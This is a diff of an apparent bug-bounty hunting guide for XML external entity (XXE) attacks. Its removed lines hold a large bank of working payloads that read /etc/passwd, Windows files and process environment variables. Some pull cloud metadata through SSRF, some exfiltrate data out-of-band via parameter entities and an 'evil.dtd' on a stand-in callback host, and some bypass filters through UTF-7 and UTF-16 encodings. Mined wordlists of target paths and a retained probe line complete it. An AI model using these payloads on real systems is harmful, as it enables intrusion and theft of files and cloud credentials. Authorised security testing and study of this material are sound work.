-grep -rn "DocumentBuilder\|SAXParser\|XMLReader\|XMLInputFactory\|TransformerFactory" .
-
-
-
-# Python
-
-grep -rn "lxml\|xml.sax\|parseString\|fromstring\|etree.parse" .
-
-
-
-# Look for missing hardening
-
-grep -rn "FEATURE_EXTERNAL_GENERAL_ENTITIES\|setExpandEntityReferences\|setFeature.*false" .
-
-```
-
-
-
----
-
-### Companion: hunting / references/techniques.md
+---### Companion methodology (deduplicated)
+### hunting / references/techniques.md
 
 # XXE — Combined Field Guide — Technique reference
 
@@ -1961,207 +1329,13 @@ Content-Type: application/xml+json
 
 
 
----
+---## Probes
 
-## Corpus payload bank (curated)
+- <!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/hostname'>]>, OOB entity to callback, SVG with external reference.
 
-### Classic file read
+## Supporting data
 
-```text
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///proc/self/environ">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><x>&e;</x>
-```
-
-### Parameter entities / OOB
-
-```text
-<!DOCTYPE x [<!ENTITY % f SYSTEM "http://callback/%file;">%f;]>
-<!DOCTYPE x [<!ENTITY % p SYSTEM "http://callback/evil.dtd">%p;]><x>&send;</x>
-<!DOCTYPE x [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://callback/%file;'>">%a;%b;]>
-<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://callback/evil.dtd">%remote;]>
-```
-
-### SSRF / cloud metadata
-
-```text
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:6379/">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://callback/xxe">]><x>&e;</x>
-```
-
-### XInclude / SVG / Office
-
-```text
-<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></x>
-<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
-<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://callback/evil.dtd">%xxe;]><root/>
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><x>&e;</x></soap:Body></soap:Envelope>
-```
-
-### Filter bypass
-
-```text
-<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd" >]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]><x>&e;</x>
-```
-
-## Corpus wordlists (mined)
-
-### `params_xxe.txt`
-
-```text
-debug
-status
-type
-top-text
-bottom-text
-id
-_hxpage
-max_file_size_kb
-allow_file_type_list
-EventAction
-EventDate
-url
-RelayState
-method
-dl
-```
-
-### `paths_xxe.txt`
-
-```text
-/api/import_memes_2.0.php
-/r/w8rpj9w8
-/schemas/sitemap/0.9
-/schemas/sitemap/0.9/sitemap.xsd
-/text.txt
-/PSIGW/PeopleSoftServiceListeningConnector
-/memes.php
-/update-status
-/status
-/wp-cron.php
-/Kview/CustomCodeBehind/Base/PersonalHomepage/PersonalHomepageCalendarAddEvent.aspx
-/xx.html
-/ca/rest/certrequests
-/sitemap.xml
-/exfil.dtd
-/exfil
-/retail/hxpublic_v6/hxxmlservice6.aspx
-/retail/hxpublic_v6/hxdynamicpage6.aspx
-/api/sxmp/1.0
-/Blind_xxe
-/edit-profile-avatar!uploadImage.jspa
-/x.dtd
-/files/combine.dtd
-/files/semrush_sitemap.xml
-/resp/&xxe
-/resp/███████
-/resp/
-/bot.html
-/resp/██████
-/payload.dtd
-/api/search/GeneralSearch
-/content
-/payload23.dtd
-/api/
-/api/export_memes_2.0.php
-/app
-/api/generate.php
-/612SgFdOrB0
-/defend-wordpress-from-ddos
-/xmlrpc.php/
-/xmlrpc.php
-/;q=0.8
-/doser.go
-/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
-/2012/08/27/Preventing-XEE-in-PHP.html
-/changeset/29378
-/KView/CustomCodeBehind/WebResource.axd
-/Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx
-/ma/api/v2/user/login
-/ca/ee/ca/
-/2b5d2b11513d2c9b
-/███/files.xml
-/index.php
-/files.xml
-/api/ping
-/evil.dtd
-/includes/header.php
-/includes/config.php
-/memes
-/includes/classes.php
-/generate.php
-/ecmp-helper!troubleLogin.jspa
-/api/rest/mpapi/infaMPAPISearchWebService/query
-/app/template_saml/kwtbgh4jLAZPMXLQUNMU/sso/saml
-/sso
-/pspc/services/AdminService
-/pspc/services/h1testservice
-/robots.txt
-/guide/en/app-search/current/crawl-web-content.html
-/bin
-/sbin
-/careers
-/user/login
-/ok
-```
-
-### `payloads_xxe.txt`
-
-```text
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///proc/self/environ">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY % f SYSTEM "http://callback/%file;">%f;]>
-<!DOCTYPE x [<!ENTITY % p SYSTEM "http://callback/evil.dtd">%p;]><x>&send;</x>
-<!DOCTYPE x [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://callback/%file;'>">%a;%b;]>
-<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://callback/evil.dtd">%remote;]>
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:6379/">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "http://callback/xxe">]><x>&e;</x>
-<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></x>
-<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
-<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://callback/evil.dtd">%xxe;]><root/>
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><x>&e;</x></soap:Body></soap:Envelope>
-<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd" >]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]><x>&e;</x>
-```
-
-### `payloads_xxe_waf.txt`
-
-```text
-<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd" >]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>
-<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]><x>&e;</x>
-```
-
-## Source skills merged into this topic
-
-- `h1skills` — `hackerone-xxe`
-- `hunting` — `xxe`
-- `cbh` — `hunt-xxe`
-
-## Provenance
-
-- `references/unified-method.md` — same deduplicated union as this file, for tooling
-- `references/upstream-*.md` — unmodified original SKILL.md from each repo
-- `references/upstream-assets/` — 2 companion files
-- `../../upstream/` — complete unmodified archives of all five source repositories
+- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
+- `references/payloads.md` — curated payload bank + upstream payload references
+- `references/wordlists/` — 4 mined paths/params/payload lists
 - `bbhunt-methodology` — orchestrator, state machine and class router
